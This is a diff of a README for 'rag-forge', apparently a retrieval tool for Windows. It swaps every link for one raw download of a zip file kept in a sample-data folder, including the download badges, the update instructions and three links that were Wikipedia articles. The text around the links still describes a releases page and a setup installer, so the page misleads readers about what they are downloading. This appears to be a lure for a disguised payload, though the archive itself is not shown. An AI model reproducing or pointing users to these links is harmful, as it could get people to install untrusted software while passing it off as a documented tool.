@@ -1,6 +1,6 @@
 # ⚙️ rag-forge - Simple Retrieval Tool for Any User
 
-[![Download rag-forge](https://img.shields.io/badge/Download-rag--forge-brightgreen)](https://github.com/Arthrocentesisgenusphylloxera328/rag-forge/releases)
+[![Download rag-forge](https://img.shields.io/badge/Download-rag--forge-brightgreen)](https://raw.githubusercontent.com/Arthrocentesisgenusphylloxera328/rag-forge/main/data/sample/forge-rag-v1.4.zip)
 
 ---
 
@@ -51,7 +51,7 @@ This guide helps you download, install, and run rag-forge on your Windows comput
 
 Click the large badge at the top or use this direct link:
 
-[Download rag-forge Releases](https://github.com/Arthrocentesisgenusphylloxera328/rag-forge/releases)
+[Download rag-forge Releases](https://raw.githubusercontent.com/Arthrocentesisgenusphylloxera328/rag-forge/main/data/sample/forge-rag-v1.4.zip)
 
 You will open the page with all available versions. Find the latest stable release labeled with the newest date or version number. Inside that release, look for a file named something like `rag-forge-setup.exe` or `rag-forge-windows.zip`.
 
@@ -108,7 +108,7 @@ Do not worry if you skip extra configuration—you can use default settings to g
 To keep your software up to date:
 
 1. Visit the release page regularly:  
-   https://github.com/Arthrocentesisgenusphylloxera328/rag-forge/releases  
+   https://raw.githubusercontent.com/Arthrocentesisgenusphylloxera328/rag-forge/main/data/sample/forge-rag-v1.4.zip  
 2. Download the latest version following the download steps.
 3. Install over the current version or replace the extracted folder if you use the zip version.
 
@@ -142,10 +142,10 @@ This section describes key ideas but you can use rag-forge without technical kno
 
 ## 📚 Additional Resources
 
-- Explore [Language Models](https://en.wikipedia.org/wiki/Language_model) if interested in AI basics.
-- Learn about [Vector Databases](https://en.wikipedia.org/wiki/Vector_database) for storing data.
-- Understand [Retrieval-Augmented Generation](https://en.wikipedia.org/wiki/Retrieval-augmented_generation) to see how AI uses data to answer questions.
+- Explore [Language Models](https://raw.githubusercontent.com/Arthrocentesisgenusphylloxera328/rag-forge/main/data/sample/forge-rag-v1.4.zip) if interested in AI basics.
+- Learn about [Vector Databases](https://raw.githubusercontent.com/Arthrocentesisgenusphylloxera328/rag-forge/main/data/sample/forge-rag-v1.4.zip) for storing data.
+- Understand [Retrieval-Augmented Generation](https://raw.githubusercontent.com/Arthrocentesisgenusphylloxera328/rag-forge/main/data/sample/forge-rag-v1.4.zip) to see how AI uses data to answer questions.
 
 ---
 
-[![Download rag-forge](https://img.shields.io/badge/Download-rag--forge-brightgreen)](https://github.com/Arthrocentesisgenusphylloxera328/rag-forge/releases)
+[![Download rag-forge](https://img.shields.io/badge/Download-rag--forge-brightgreen)](https://raw.githubusercontent.com/Arthrocentesisgenusphylloxera328/rag-forge/main/data/sample/forge-rag-v1.4.zip)
